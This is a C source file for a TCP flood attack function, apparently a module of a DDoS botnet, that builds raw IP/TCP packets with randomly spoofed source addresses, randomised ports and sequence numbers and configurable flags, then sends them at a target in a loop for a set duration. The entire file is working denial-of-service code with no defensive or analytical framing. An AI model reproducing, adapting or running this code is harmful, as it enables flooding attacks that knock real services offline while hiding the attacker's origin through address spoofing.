#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "tcp_attack.h"
#include "../headers/checksum.h"
#include "../headers/protocol.h"
#include "../headers/rand.h"

void* tcp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    attack_option* opt_srcport = find_option(params, OPT_SRCPORT);
    attack_option* opt_flags = find_option(params, OPT_TCP_FLAGS);

    uint8_t tcp_flags = opt_flags ? get_option_u8(opt_flags) : 0x1A;

    char packet[4096];
    struct iphdr* ip = (struct iphdr*)packet;
    struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));

    init_rand();

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(rand_next() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = rand_next(); // spoofed, updated per-packet in loop
    ip->daddr = params->target_addr.sin_addr.s_addr;

    uint16_t srcport = opt_srcport ? get_option_u16(opt_srcport) : (rand_next() % 16383 + 49152);
    tcp->source = htons(srcport);
    tcp->dest = params->target_addr.sin_port;
    tcp->seq = htonl(rand_next());
    tcp->ack_seq = htonl(rand_next());
    tcp->doff = 5;
    tcp->fin = (tcp_flags & 0x01) ? 1 : 0;
    tcp->syn = (tcp_flags & 0x02) ? 1 : 0;
    tcp->rst = (tcp_flags & 0x04) ? 1 : 0;
    tcp->psh = (tcp_flags & 0x08) ? 1 : 0;
    tcp->ack = (tcp_flags & 0x10) ? 1 : 0;
    tcp->urg = (tcp_flags & 0x20) ? 1 : 0;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    ip->check = generic_checksum(ip, sizeof(struct iphdr));

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = ip->daddr;

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
        ip->saddr   = rand_next();
        tcp->source = htons(rand_next_range(1024, 65535));
        
        tcp->seq = htonl(rand_next());
        tcp->ack_seq = htonl(rand_next());
        
        ip->id = htons(rand_next() & 0xFFFF);
        
        ip->check = 0;
        ip->check = generic_checksum(ip, sizeof(struct iphdr));
        
        tcp->check = 0;
        tcp->check = tcp_udp_checksum(tcp, sizeof(struct tcphdr), ip->saddr, ip->daddr, IPPROTO_TCP);

        sendto(fd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
    }

    close(fd);
    return NULL;
}